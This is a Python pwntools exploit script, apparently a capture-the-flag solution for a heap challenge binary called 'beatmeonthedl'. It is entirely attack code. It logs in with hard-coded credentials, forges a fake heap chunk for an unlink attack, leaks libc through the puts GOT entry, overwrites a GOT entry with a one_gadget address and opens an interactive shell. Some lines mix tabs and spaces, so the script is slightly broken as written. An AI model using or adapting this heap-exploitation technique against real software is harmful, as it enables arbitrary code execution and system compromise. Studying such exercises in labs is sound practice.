from pwn import *

#malloc(56)
def add_request(data):
	p.sendlineafter('| ', '1')
	p.sendlineafter('Request text > ', data)

def delete_request(idx):
	p.sendlineafter('| ', '3')
	p.sendlineafter('choice: ', str(idx))

def update_request(idx, data):
	p.sendlineafter('| ', '4')
	p.sendlineafter('choice: ', str(idx))
	p.sendlineafter('data: ', data)

def leak():
	p.sendlineafter('| ', '2')
	p.recvuntil('0) ')
	return u64(p.recv(6).ljust(8, '\x00'))

def exploit():
	p.sendline('5')
	p.interactive()

if __name__ == "__main__":
	id = "mcfly"
    	passwd = "awesnap"

	p = process('beatmeonthedl')
	elf = ELF('beatmeonthedl')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	puts_offset = libc.symbols['puts']
	reqlist = elf.symbols['reqlist']
	puts_got = elf.got['puts']
	one_gadget = 0x45216

    	p.sendlineafter('Enter username: ', id) 
    	p.sendlineafter('Enter Pass: ', passwd)
	
	add_request("AAAA")
	add_request("BBBB")
	add_request("CCCC")
	add_request("DDDD")

	#pause()

	payload = p64(0)*2	#FAKE CHUNK
	payload += p64(0x609e90-24)	#FB
	payload += p64(0x609e90-16)	#BK
	
	payload += "H"*16
	payload += p64(0x30) #prev_size
	payload += p64(0x42) #size

	update_request(2, payload)
	#pause()
	delete_request(3)	
	update_request(2, p64(puts_got)*3)

	libc_puts = leak()
	libc_base = libc_puts - puts_offset
	one_gadget = libc_base + one_gadget
	log.info("[+] leaked libc@puts = {}".format(hex(libc_puts)))
	log.info("[+] libc_base = {}".format(hex(libc_base)))
	log.info("[+] one_gadget = {}".format(hex(one_gadget)))
	log.info("[+] Exploit!")
	
	update_request(1, p64(one_gadget))
	exploit()
